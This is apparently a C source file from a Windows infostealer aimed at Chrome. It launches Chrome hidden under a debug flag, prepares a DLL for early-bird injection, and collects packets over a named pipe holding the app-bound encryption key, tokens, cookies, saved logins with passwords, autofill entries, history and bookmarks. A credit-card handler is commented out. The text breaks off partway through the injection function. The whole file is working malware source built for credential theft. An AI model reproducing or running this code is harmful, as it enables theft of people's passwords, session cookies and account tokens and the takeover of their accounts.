#include "Headers.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExpandArray(IN OUT PVOID* ppArray, IN DWORD dwItemSize, IN OUT PDWORD pdwCapacity)
{
    PVOID   pNewArray       = NULL;

#define GROWTH_FACTOR 2
    DWORD   dwNewCapacity   = (*pdwCapacity) * GROWTH_FACTOR;
#undef GROWTH_FACTOR

    if (!(pNewArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewCapacity * dwItemSize)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    RtlCopyMemory(pNewArray, *ppArray, (*pdwCapacity) * dwItemSize);

    HEAP_FREE(*ppArray);

    *ppArray        = pNewArray;
    *pdwCapacity    = dwNewCapacity;

    return TRUE;
}

static PBYTE DuplicateBuffer(IN PBYTE pbSrc, IN DWORD dwLen)
{
    PBYTE pbDst = NULL;

    if (!pbSrc || dwLen == 0)
        return NULL;

    if (!(pbDst = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    RtlCopyMemory(pbDst, pbSrc, dwLen);
    return pbDst;
}

static LPSTR DuplicateAnsiString(IN LPCSTR pszSrc)
{
    SIZE_T  cchSrc  = 0;
    SIZE_T  cbAlloc = 0;
    LPSTR   pszDst  = NULL;

    if (!pszSrc) return NULL;

    cchSrc  = (SIZE_T)lstrlenA(pszSrc);
    cbAlloc = (cchSrc + 1) * sizeof(CHAR);

    if (!(pszDst = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAlloc)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return NULL;
    }

    StringCchCopyA(pszDst, cchSrc + 1, pszSrc);
    return pszDst;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ProcessAppBoundKeyPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    if (!pChromeData || !pbData || cbData == 0)
        return FALSE;

    HEAP_FREE_SECURE(pChromeData->pbAppBoundKey, pChromeData->dwAppBoundKeyLen);

    if (!(pChromeData->pbAppBoundKey = DuplicateBuffer(pbData, cbData)))
        return FALSE;

    pChromeData->dwAppBoundKeyLen = cbData;
    return TRUE;
}

static BOOL ProcessTokenPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PTOKEN_RECORD_PACKET    pPacket     = (PTOKEN_RECORD_PACKET)pbData;
    PTOKEN_ENTRY            pEntry      = NULL;
    PBYTE                   pCursor     = NULL;

    if (!pChromeData || !pbData || cbData < sizeof(TOKEN_RECORD_PACKET))
        return FALSE;

    if (pChromeData->dwTokenCount >= pChromeData->dwTokenCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromeData->pTokens, sizeof(TOKEN_ENTRY), &pChromeData->dwTokenCapacity))
            return FALSE;
    }

    pEntry  = &pChromeData->pTokens[pChromeData->dwTokenCount];
    pCursor = pPacket->bData;

    pEntry->pszService      = DuplicateAnsiString((LPCSTR)pCursor);            pCursor += pPacket->dwServiceLen;
    pEntry->pbToken         = DuplicateBuffer(pCursor, pPacket->dwTokenLen);   pCursor += pPacket->dwTokenLen;
    pEntry->dwTokenLen      = pPacket->dwTokenLen;

    if (pPacket->dwBindKeyLen > 0)
    {
        pEntry->pbBindKey       = DuplicateBuffer(pCursor, pPacket->dwBindKeyLen);
        pEntry->dwBindKeyLen    = pPacket->dwBindKeyLen;
    }

    pChromeData->dwTokenCount++;
    return TRUE;
}

static BOOL ProcessCookiePacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PCOOKIE_RECORD_PACKET   pPacket     = (PCOOKIE_RECORD_PACKET)pbData;
    PCOOKIE_ENTRY           pEntry      = NULL;
    PBYTE                   pCursor     = NULL;

    if (!pChromeData || !pbData || cbData < sizeof(COOKIE_RECORD_PACKET))
        return FALSE;

    if (pChromeData->dwCookieCount >= pChromeData->dwCookieCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromeData->pCookies, sizeof(COOKIE_ENTRY), &pChromeData->dwCookieCapacity))
            return FALSE;
    }

    pEntry  = &pChromeData->pCookies[pChromeData->dwCookieCount];
    pCursor = pPacket->bData;

    pEntry->pszHostKey      = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwHostKeyLen;
    pEntry->pszPath         = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwPathLen;
    pEntry->pszName         = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwNameLen;
    pEntry->llExpiresUtc    = pPacket->llExpiresUtc;
    pEntry->pbValue         = DuplicateBuffer(pCursor, pPacket->dwEncryptedValueLen);
    pEntry->dwValueLen      = pPacket->dwEncryptedValueLen;

    pChromeData->dwCookieCount++;
    return TRUE;
}

static BOOL ProcessLoginPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PLOGIN_RECORD_PACKET    pPacket     = (PLOGIN_RECORD_PACKET)pbData;
    PLOGIN_ENTRY            pEntry      = NULL;
    PBYTE                   pCursor     = NULL;

    if (!pChromeData || !pbData || cbData < sizeof(LOGIN_RECORD_PACKET))
        return FALSE;

    if (pChromeData->dwLoginCount >= pChromeData->dwLoginCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromeData->pLogins, sizeof(LOGIN_ENTRY), &pChromeData->dwLoginCapacity))
            return FALSE;
    }

    pEntry  = &pChromeData->pLogins[pChromeData->dwLoginCount];
    pCursor = pPacket->bData;

    pEntry->pszOriginUrl    = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwOriginUrlLen;
    pEntry->pszActionUrl    = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwActionUrlLen;
    pEntry->pszUsername     = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwUsernameLen;
    pEntry->pbPassword      = DuplicateBuffer(pCursor, pPacket->dwPasswordLen);
    pEntry->dwPasswordLen   = pPacket->dwPasswordLen;
    pEntry->llDateCreated   = pPacket->llDateCreated;
    pEntry->llDateLastUsed  = pPacket->llDateLastUsed;

    pChromeData->dwLoginCount++;
    return TRUE;
}

/*
static BOOL ProcessCreditCardPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PCREDIT_CARD_RECORD_PACKET  pPacket     = (PCREDIT_CARD_RECORD_PACKET)pbData;
    PCREDIT_CARD_ENTRY          pEntry      = NULL;
    PBYTE                       pCursor     = NULL;

    if (!pChromeData || !pbData || cbData < sizeof(CREDIT_CARD_RECORD_PACKET))
        return FALSE;

    if (pChromeData->dwCreditCardCount >= pChromeData->dwCreditCardCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromeData->pCreditCards, sizeof(CREDIT_CARD_ENTRY), &pChromeData->dwCreditCardCapacity))
            return FALSE;
    }

    pEntry  = &pChromeData->pCreditCards[pChromeData->dwCreditCardCount];
    pCursor = pPacket->bData;

    pEntry->pszNameOnCard       = DuplicateAnsiString((LPCSTR)pCursor);                 pCursor += pPacket->dwNameOnCardLen;

    if (pPacket->dwNicknameLen > 0)
    {
        pEntry->pszNickname     = DuplicateAnsiString((LPCSTR)pCursor);                 pCursor += pPacket->dwNicknameLen;
    }

    pEntry->dwExpirationMonth   = pPacket->dwExpirationMonth;
    pEntry->dwExpirationYear    = pPacket->dwExpirationYear;
    pEntry->llDateModified      = pPacket->llDateModified;
    pEntry->pbCardNumber        = DuplicateBuffer(pCursor, pPacket->dwEncryptedCardNumberLen);
    pEntry->dwCardNumberLen     = pPacket->dwEncryptedCardNumberLen;

    pChromeData->dwCreditCardCount++;
    return TRUE;
}
*/

static BOOL ProcessAutofillPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PAUTOFILL_RECORD_PACKET pPacket     = (PAUTOFILL_RECORD_PACKET)pbData;
    PAUTOFILL_ENTRY         pEntry      = NULL;
    PBYTE                   pCursor     = NULL;

    if (!pChromeData || !pbData || cbData < sizeof(AUTOFILL_RECORD_PACKET))
        return FALSE;

    if (pChromeData->dwAutofillCount >= pChromeData->dwAutofillCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromeData->pAutofill, sizeof(AUTOFILL_ENTRY), &pChromeData->dwAutofillCapacity))
            return FALSE;
    }

    pEntry  = &pChromeData->pAutofill[pChromeData->dwAutofillCount];
    pCursor = pPacket->bData;

    pEntry->pszName         = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwNameLen;
    pEntry->pszValue        = DuplicateAnsiString((LPCSTR)pCursor);
    pEntry->llDateCreated   = pPacket->llDateCreated;
    pEntry->dwCount         = pPacket->dwCount;

    pChromeData->dwAutofillCount++;
    return TRUE;
}

static BOOL ProcessHistoryPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PHISTORY_RECORD_PACKET  pPacket     = (PHISTORY_RECORD_PACKET)pbData;
    PHISTORY_ENTRY          pEntry      = NULL;
    PBYTE                   pCursor     = NULL;

    if (!pChromeData || !pbData || cbData < sizeof(HISTORY_RECORD_PACKET))
        return FALSE;

    if (pChromeData->dwHistoryCount >= pChromeData->dwHistoryCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromeData->pHistory, sizeof(HISTORY_ENTRY), &pChromeData->dwHistoryCapacity))
            return FALSE;
    }

    pEntry  = &pChromeData->pHistory[pChromeData->dwHistoryCount];
    pCursor = pPacket->bData;

    pEntry->pszUrl          = DuplicateAnsiString((LPCSTR)pCursor);                     pCursor += pPacket->dwUrlLen;

    if (pPacket->dwTitleLen > 0)
        pEntry->pszTitle    = DuplicateAnsiString((LPCSTR)pCursor);

    pEntry->dwVisitCount    = pPacket->dwVisitCount;
    pEntry->llLastVisitTime = pPacket->llLastVisitTime;

    pChromeData->dwHistoryCount++;
    return TRUE;
}

static BOOL ProcessBookmarkPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PBOOKMARK_RECORD_PACKET pPacket     = (PBOOKMARK_RECORD_PACKET)pbData;
    PBOOKMARK_ENTRY         pEntry      = NULL;
    PBYTE                   pCursor     = NULL;

    if (!pChromeData || !pbData || cbData < sizeof(BOOKMARK_RECORD_PACKET))
        return FALSE;

    if (pChromeData->dwBookmarkCount >= pChromeData->dwBookmarkCapacity)
    {
        if (!ExpandArray((PVOID*)&pChromeData->pBookmarks, sizeof(BOOKMARK_ENTRY), &pChromeData->dwBookmarkCapacity))
            return FALSE;
    }

    pEntry  = &pChromeData->pBookmarks[pChromeData->dwBookmarkCount];
    pCursor = pPacket->bData;

    pEntry->pszName     = DuplicateAnsiString((LPCSTR)pCursor);                         pCursor += pPacket->dwNameLen;
    pEntry->pszUrl      = DuplicateAnsiString((LPCSTR)pCursor);
    pEntry->llDateAdded = pPacket->llDateAdded;

    pChromeData->dwBookmarkCount++;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ProcessDataPacket(IN PCHROME_DATA pChromeData, IN PBYTE pbData, IN DWORD cbData)
{
    PDATA_PACKET pPacket = (PDATA_PACKET)pbData;

    if (!pChromeData || !pbData || cbData < sizeof(DATA_PACKET))
        return FALSE;

    switch (pPacket->dwSignature)
    {
        case PACKET_SIG_APP_BOUND_KEY:
            return ProcessAppBoundKeyPacket(pChromeData, pPacket->bData, pPacket->dwDataSize);

        case PACKET_SIG_TOKEN:
            return ProcessTokenPacket(pChromeData, pPacket->bData, pPacket->dwDataSize);

        case PACKET_SIG_COOKIE:
            return ProcessCookiePacket(pChromeData, pPacket->bData, pPacket->dwDataSize);

        case PACKET_SIG_LOGIN:
            return ProcessLoginPacket(pChromeData, pPacket->bData, pPacket->dwDataSize);

        /*
         case PACKET_SIG_CREDIT_CARD:
            return ProcessCreditCardPacket(pChromeData, pPacket->bData, pPacket->dwDataSize);
        */

        case PACKET_SIG_AUTOFILL:
            return ProcessAutofillPacket(pChromeData, pPacket->bData, pPacket->dwDataSize);

        case PACKET_SIG_HISTORY:
            return ProcessHistoryPacket(pChromeData, pPacket->bData, pPacket->dwDataSize);

        case PACKET_SIG_BOOKMARK:
            return ProcessBookmarkPacket(pChromeData, pPacket->bData, pPacket->dwDataSize);

        default:
            return FALSE;
    }
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeChromeData(IN OUT PCHROME_DATA pChromeData)
{
    if (!pChromeData)
        return FALSE;

    RtlSecureZeroMemory(pChromeData, sizeof(CHROME_DATA));

    pChromeData->dwTokenCapacity        = INITIAL_ARRAY_CAPACITY;
    pChromeData->dwCookieCapacity       = INITIAL_ARRAY_CAPACITY;
    pChromeData->dwLoginCapacity        = INITIAL_ARRAY_CAPACITY;
    // pChromeData->dwCreditCardCapacity   = INITIAL_ARRAY_CAPACITY;
    pChromeData->dwAutofillCapacity     = INITIAL_ARRAY_CAPACITY;
    pChromeData->dwHistoryCapacity      = INITIAL_ARRAY_CAPACITY;
    pChromeData->dwBookmarkCapacity     = INITIAL_ARRAY_CAPACITY;

    if (!(pChromeData->pTokens = (PTOKEN_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(TOKEN_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromeData->pCookies = (PCOOKIE_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COOKIE_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromeData->pLogins = (PLOGIN_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LOGIN_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    /*
    if (!(pChromeData->pCreditCards = (PCREDIT_CARD_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CREDIT_CARD_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;
    */

    if (!(pChromeData->pAutofill = (PAUTOFILL_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(AUTOFILL_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromeData->pHistory = (PHISTORY_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HISTORY_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromeData->pBookmarks = (PBOOKMARK_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(BOOKMARK_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    return TRUE;
}


VOID FreeChromeData(IN OUT PCHROME_DATA pChromeData)
{
    if (!pChromeData)
        return;

    HEAP_FREE_SECURE(pChromeData->pbAppBoundKey, pChromeData->dwAppBoundKeyLen);

    if (pChromeData->pTokens)
    {
        for (DWORD i = 0; i < pChromeData->dwTokenCount; i++)
        {
            HEAP_FREE(pChromeData->pTokens[i].pszService);
            HEAP_FREE_SECURE(pChromeData->pTokens[i].pbToken, pChromeData->pTokens[i].dwTokenLen);
            HEAP_FREE_SECURE(pChromeData->pTokens[i].pbBindKey, pChromeData->pTokens[i].dwBindKeyLen);
        }
        HEAP_FREE(pChromeData->pTokens);
    }

    if (pChromeData->pCookies)
    {
        for (DWORD i = 0; i < pChromeData->dwCookieCount; i++)
        {
            HEAP_FREE(pChromeData->pCookies[i].pszHostKey);
            HEAP_FREE(pChromeData->pCookies[i].pszPath);
            HEAP_FREE(pChromeData->pCookies[i].pszName);
            HEAP_FREE_SECURE(pChromeData->pCookies[i].pbValue, pChromeData->pCookies[i].dwValueLen);
        }
        HEAP_FREE(pChromeData->pCookies);
    }

    if (pChromeData->pLogins)
    {
        for (DWORD i = 0; i < pChromeData->dwLoginCount; i++)
        {
            HEAP_FREE(pChromeData->pLogins[i].pszOriginUrl);
            HEAP_FREE(pChromeData->pLogins[i].pszActionUrl);
            HEAP_FREE(pChromeData->pLogins[i].pszUsername);
            HEAP_FREE_SECURE(pChromeData->pLogins[i].pbPassword, pChromeData->pLogins[i].dwPasswordLen);
        }
        HEAP_FREE(pChromeData->pLogins);
    }

    /*
    if (pChromeData->pCreditCards)
    {
        for (DWORD i = 0; i < pChromeData->dwCreditCardCount; i++)
        {
            HEAP_FREE(pChromeData->pCreditCards[i].pszNameOnCard);
            HEAP_FREE(pChromeData->pCreditCards[i].pszNickname);
            HEAP_FREE_SECURE(pChromeData->pCreditCards[i].pbCardNumber, pChromeData->pCreditCards[i].dwCardNumberLen);
        }
        HEAP_FREE(pChromeData->pCreditCards);
    }
    */

    if (pChromeData->pAutofill)
    {
        for (DWORD i = 0; i < pChromeData->dwAutofillCount; i++)
        {
            HEAP_FREE(pChromeData->pAutofill[i].pszName);
            HEAP_FREE(pChromeData->pAutofill[i].pszValue);
        }
        HEAP_FREE(pChromeData->pAutofill);
    }

    if (pChromeData->pHistory)
    {
        for (DWORD i = 0; i < pChromeData->dwHistoryCount; i++)
        {
            HEAP_FREE(pChromeData->pHistory[i].pszUrl);
            HEAP_FREE(pChromeData->pHistory[i].pszTitle);
        }
        HEAP_FREE(pChromeData->pHistory);
    }

    if (pChromeData->pBookmarks)
    {
        for (DWORD i = 0; i < pChromeData->dwBookmarkCount; i++)
        {
            HEAP_FREE(pChromeData->pBookmarks[i].pszName);
            HEAP_FREE(pChromeData->pBookmarks[i].pszUrl);
        }
        HEAP_FREE(pChromeData->pBookmarks);
    }

    RtlSecureZeroMemory(pChromeData, sizeof(CHROME_DATA));
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _PIPE_THREAD_CONTEXT
{
    HANDLE          hPipe;
    PCHROME_DATA    pChromeData;
} PIPE_THREAD_CONTEXT, *PPIPE_THREAD_CONTEXT;

static BOOL IsPacketSignature(DWORD dwValue)
{
    return (dwValue == PACKET_SIG_APP_BOUND_KEY ||
            dwValue == PACKET_SIG_TOKEN         ||
            dwValue == PACKET_SIG_COOKIE        ||
            dwValue == PACKET_SIG_LOGIN         ||
            dwValue == PACKET_SIG_CREDIT_CARD   ||
            dwValue == PACKET_SIG_AUTOFILL      ||
            dwValue == PACKET_SIG_HISTORY       ||
            dwValue == PACKET_SIG_BOOKMARK);
}


static DWORD WINAPI PipeReaderThread(IN LPVOID lpParam)
{
    PPIPE_THREAD_CONTEXT    pContext            = (PPIPE_THREAD_CONTEXT)lpParam;
    HANDLE                  hPipe               = pContext->hPipe;
    PCHROME_DATA            pChromeData         = pContext->pChromeData;
    PBYTE                   pbBuf               = NULL,
                            pbAccumulator       = NULL;
    DWORD                   dwAccumSize         = 0x00,
                            dwAccumCapacity     = BUFFER_SIZE_8192 * 4,
                            dwReadBytes         = 0x00,
                            dwOffset            = 0x00;

    if (!(pbBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE_8192)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pbAccumulator = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwAccumCapacity)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED)
    {
        printf("[!] ConnectNamedPipe Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[+] DLL Connected To Pipe:\n\n");

    while (ReadFile(hPipe, pbBuf, BUFFER_SIZE_8192, &dwReadBytes, NULL) && dwReadBytes > 0)
    {
        // Expand accumulator if needed
        if (dwAccumSize + dwReadBytes > dwAccumCapacity)
        {
#define GROWTH_FACTOR 2
            DWORD   dwNewCapacity   = dwAccumCapacity * GROWTH_FACTOR;
            PBYTE   pbNewAccum      = NULL;
#undef GROWTH_FACTOR

            if (!(pbNewAccum = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewCapacity)))
            {
                printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
                break;
            }

            RtlCopyMemory(pbNewAccum, pbAccumulator, dwAccumSize);
            HEAP_FREE(pbAccumulator);

            pbAccumulator   = pbNewAccum;
            dwAccumCapacity = dwNewCapacity;
        }

        // Append new data to accumulator
        RtlCopyMemory(pbAccumulator + dwAccumSize, pbBuf, dwReadBytes);
        dwAccumSize += dwReadBytes;


        while (dwOffset < dwAccumSize)
        {
            PDATA_PACKET    pPacket         = NULL;
            DWORD           dwPacketSize    = 0x00,
                            dwSignature     = 0x00,
                            dwTextStart     = 0x00;

            // Check if we have enough bytes for a potential signature
            if (dwOffset + sizeof(DWORD) <= dwAccumSize)
            {
                dwSignature = *(PDWORD)(pbAccumulator + dwOffset);

                if (IsPacketSignature(dwSignature))
                {
                    // Check if we have enough for packet header
                    if (dwOffset + sizeof(DATA_PACKET) > dwAccumSize) break;

                    pPacket         = (PDATA_PACKET)(pbAccumulator + dwOffset);
                    dwPacketSize    = sizeof(DATA_PACKET) + pPacket->dwDataSize;

                    // Check if we have complete packet
                    if (dwOffset + dwPacketSize > dwAccumSize) break;

                    // Process complete packet
                    ProcessDataPacket(pChromeData, pbAccumulator + dwOffset, dwPacketSize);
                    dwOffset += dwPacketSize;
                    continue;
                }
            }

            // Not a packet signature
            dwTextStart = dwOffset;

            while (dwOffset < dwAccumSize)
            {
                if (dwOffset + sizeof(DWORD) <= dwAccumSize)
                {
                    dwSignature = *(PDWORD)(pbAccumulator + dwOffset);

                    if (IsPacketSignature(dwSignature))
                        break;
                }
                dwOffset++;
            }

            // Print text portion
            if (dwOffset > dwTextStart)
                printf("%.*s", dwOffset - dwTextStart, (LPSTR)(pbAccumulator + dwTextStart));
        }

        // Move unprocessed data to beginning of accumulator
        if (dwOffset < dwAccumSize)
        {
            RtlMoveMemory(pbAccumulator, pbAccumulator + dwOffset, dwAccumSize - dwOffset);
            dwAccumSize -= dwOffset;
        }
        else
        {
            dwAccumSize = 0x00;
        }

        dwOffset = 0x00;
    }

    // Print any remaining text
    if (dwAccumSize > 0)
        printf("%.*s", dwAccumSize, (LPSTR)pbAccumulator);

_END_OF_FUNC:
    HEAP_FREE(pbBuf);
    HEAP_FREE(pbAccumulator);
    if (hPipe)
        CloseHandle(hPipe);
    return 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CreateAlertableProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, OUT PROCESS_INFORMATION* pProcessInfo)
{
    STARTUPINFOW            StartupInfoW            = { .cb = sizeof(STARTUPINFOW) };
    SECURITY_ATTRIBUTES     SecurityAttribute       = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    LPWSTR                  szCmdLine               = NULL;
    SIZE_T                  cbCmdLine               = 0x00;
    HANDLE                  hNul                    = INVALID_HANDLE_VALUE;

    if (!szProcessPath || !pProcessInfo) return FALSE;

    RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

    cbCmdLine = (lstrlenW(szProcessPath) + 3) * sizeof(WCHAR); 
    if (szArguments) cbCmdLine += (lstrlenW(szArguments) + 1) * sizeof(WCHAR);

    if (!(szCmdLine = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCmdLine)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (szArguments)
    {
        if (FAILED(StringCbPrintfW(szCmdLine, cbCmdLine, L"\"%s\" %s", szProcessPath, szArguments)))
        {
            printf("[!] StringCbPrintfW Failed\n");
            goto _END_OF_FUNC;
        }
    }
    else
    {
        if (FAILED(StringCbPrintfW(szCmdLine, cbCmdLine, L"\"%s\"", szProcessPath)))
        {
            printf("[!] StringCbPrintfW Failed\n");
            goto _END_OF_FUNC;
        }
    }

    // Redirect stderr to NUL to suppress Chrome debug output
    if ((hNul = CreateFileW(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, &SecurityAttribute, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
    {
        StartupInfoW.dwFlags    = STARTF_USESTDHANDLES;
        StartupInfoW.hStdInput  = NULL;
        StartupInfoW.hStdOutput = hNul;
        StartupInfoW.hStdError  = hNul;
    }

    if (!CreateProcessW(NULL, szCmdLine, NULL, NULL, TRUE, (DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW | DETACHED_PROCESS), NULL, NULL, &StartupInfoW, pProcessInfo))
    {
        printf("[!] CreateProcessW Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hNul != INVALID_HANDLE_VALUE)
        CloseHandle(hNul);
    HEAP_FREE(szCmdLine);
    return pProcessInfo->hProcess ? TRUE : FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL GetChromePath(IN OUT LPWSTR szChromePath, IN DWORD dwSize)
{
    HRESULT hResult      = S_OK;
    HKEY    hKey         = NULL;
    DWORD   dwPathLen    = dwSize,
            dwType       = REG_SZ,
            dwDataSize   = dwSize * sizeof(WCHAR);
    LSTATUS STATUS       = 0x00;

    if (!szChromePath || dwSize == 0) return FALSE;
    
    if (FAILED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_EXECUTABLE, STR_CHROME_PROGID, L"open", szChromePath, &dwPathLen))))
    {
        printf("[!] AssocQueryStringW Failed With Error: 0x%08X\n", hResult);
    }
    else
    {
        if (GetFileAttributesW(szChromePath) != INVALID_FILE_ATTRIBUTES)
            return TRUE;
    }
    
    if ((STATUS = RegOpenKeyExW(HKEY_LOCAL_MACHINE, STR_CHROME_REGKEY, 0, KEY_READ, &hKey)) != ERROR_SUCCESS)
    {
        printf("[!] RegOpenKeyExW Failed With Error: %ld\n", STATUS);
        return FALSE;
    }

    if ((STATUS = RegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szChromePath, &dwDataSize)) != ERROR_SUCCESS)
    {
        printf("[!] RegQueryValueExW Failed With Error: %ld\n", STATUS);
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);

    if (GetFileAttributesW(szChromePath) == INVALID_FILE_ATTRIBUTES)
    {
        printf("[!] GetFileAttributesW Failed For '%ws' With Error: %lu\n", szChromePath, GetLastError());
        return FALSE;
    }

    return TRUE;
}

static BOOL GetDllPath(IN OUT LPWSTR szDllPathtobeInjected, IN DWORD dwSize)
{
    LPWSTR  szCurrentProgramPath    = NULL;
    LPWSTR  szLastSlash             = NULL;
    BOOL    bResult                 = FALSE;

    if (!szDllPathtobeInjected || dwSize == 0) return FALSE;

    if (!(szCurrentProgramPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!GetModuleFileNameW(NULL, szCurrentProgramPath, MAX_PATH))
    {
        printf("[!] GetModuleFileNameW Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(szLastSlash = wcsrchr(szCurrentProgramPath, L'\\')))
    {
        printf("[!] Invalid executable path\n");
        goto _END_OF_FUNC;
    }

    *(szLastSlash + 1) = L'\0';

    if (FAILED(StringCchPrintfW(szDllPathtobeInjected, dwSize, L"%s%s", szCurrentProgramPath, STR_DLL_NAME)))
    {
        printf("[!] StringCchPrintfW Failed\n");
        goto _END_OF_FUNC;
    }

    if (GetFileAttributesW(szDllPathtobeInjected) == INVALID_FILE_ATTRIBUTES)
    {
        printf("[!] GetFileAttributesW Failed For '%ws' With Error: %lu\n", szDllPathtobeInjected, GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(szCurrentProgramPath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InjectDllViaEarlyBird(OUT PCHROME_DATA pChromeData)
{
    PROCESS_INFORMATION     ProcessInfo                     = { 0 };
    PIPE_THREAD_CONTEXT     PipeContext                     = { 0 };
    CHAR                    szPipeName[BUFFER_SIZE_32]      = { 0 };
    HANDLE                  hPipe                           = NULL;
    HANDLE                  hPipeThread                     = NULL;
    LPVOID                  pRemoteDllPath                  = NULL;
    LPWSTR                  szDllPath                       = NULL;
    LPWSTR                  szChromePath                    = NULL;
